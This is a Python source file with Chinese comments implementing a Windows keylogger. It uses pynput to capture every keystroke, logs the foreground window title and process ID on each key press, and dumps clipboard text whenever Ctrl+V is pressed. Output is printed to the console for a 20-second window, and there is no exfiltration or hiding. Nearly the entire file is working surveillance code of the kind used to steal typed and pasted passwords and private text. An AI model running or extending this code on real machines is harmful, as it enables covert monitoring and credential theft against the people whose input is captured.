# 导入时间模块用于计时
import time
# Windows GUI 操作模块
import win32gui
# Windows 进程操作模块
import win32process
# Windows 剪贴板操作模块
import win32clipboard
# 键盘监听库
from pynput import keyboard

# 全局超时设置（单位：秒）
TIMEOUT = 20


class Keylogger:
    def __init__(self):
        """ 初始化键盘记录器 """
        self.current_window = None  # 当前活动窗口信息
        self.ctrl_pressed = False  # Ctrl 键状态标志

    def get_current_window(self):
        """
        获取当前焦点窗口信息（Windows 专用实现）
        原理：
        1. 通过 win32gui 获取前台窗口句柄
        2. 获取窗口所属进程ID
        3. 获取窗口标题文本
        """
        try:
            # 获取当前焦点窗口的句柄
            hwnd = win32gui.GetForegroundWindow()
            # 获取窗口线程ID和进程ID (返回元组: (线程ID, 进程ID))
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            # 获取窗口标题
            title = win32gui.GetWindowText(hwnd)
            # 组合窗口信息
            self.current_window = f"{title} (PID: {pid})"
            print(f"\n[Window] {self.current_window}")
        except Exception as e:
            print(f"窗口追踪错误: {e}")

    def get_clipboard(self):
        """
        获取剪贴板文本内容（Windows 专用实现）
        流程：
        1. 打开剪贴板
        2. 检查文本格式是否可用
        3. 获取并解码内容
        4. 异常处理和资源释放
        """
        try:
            win32clipboard.OpenClipboard()
            # 检查剪贴板是否为文本格式
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                data = win32clipboard.GetClipboardData()
                # 处理字节类型数据（Python 3兼容）
                if isinstance(data, bytes):
                    return data.decode('utf-8', errors='ignore')
                return data
            return "[空剪贴板]"
        except Exception as e:
            return f"[剪贴板错误: {str(e)}]"
        finally:
            # 确保关闭剪贴板（重要！否则会阻塞其他程序访问）
            win32clipboard.CloseClipboard()

    def on_press(self, key):
        """
        按键按下回调函数
        功能：
        1. 检测窗口变化
        2. 跟踪 Ctrl 键状态
        3. 输出可打印字符
        """
        # 每次按键都检查窗口是否变化
        self.get_current_window()

        # 检测左右 Ctrl 键按下
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self.ctrl_pressed = True

        # 尝试获取字符（过滤功能键）
        try:
            # 直接输出可打印字符（end='' 避免换行，flush 立即显示）
            print(key.char, end='', flush=True)
        except AttributeError:
            # 忽略没有 char 属性的特殊键（如Shift等）
            pass

    def on_release(self, key):
        """
        按键释放回调函数
        功能：
        1. 检测 Ctrl+V 组合
        2. 清除 Ctrl 键状态
        3. ESC 键退出机制
        """
        # 检测字母 V 键释放且 Ctrl 处于按下状态
        if key == keyboard.KeyCode.from_char('v') and self.ctrl_pressed:
            content = self.get_clipboard()
            print(f"\n[粘贴] {content}", flush=True)

        # 清除 Ctrl 键状态
        if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
            self.ctrl_pressed = False

        # 按下 ESC 键返回 False 停止监听
        if key == keyboard.Key.esc:
            return False


def run():
    """ 主运行函数 """
    # 初始化键盘记录器实例
    kl = Keylogger()

    # 使用 with 语句管理监听器生命周期
    with keyboard.Listener(
            on_press=kl.on_press,  # 绑定按下事件处理
            on_release=kl.on_release  # 绑定释放事件处理
    ) as listener:
        # 记录启动时间
        start_time = time.time()
        # 循环检测是否超时
        while time.time() - start_time < TIMEOUT:
            # 降低 CPU 占用（秒级精度足够）
            time.sleep(0.1)

        # 超时后停止监听
        listener.stop()

    print('完成.')


if __name__ == '__main__':
    run()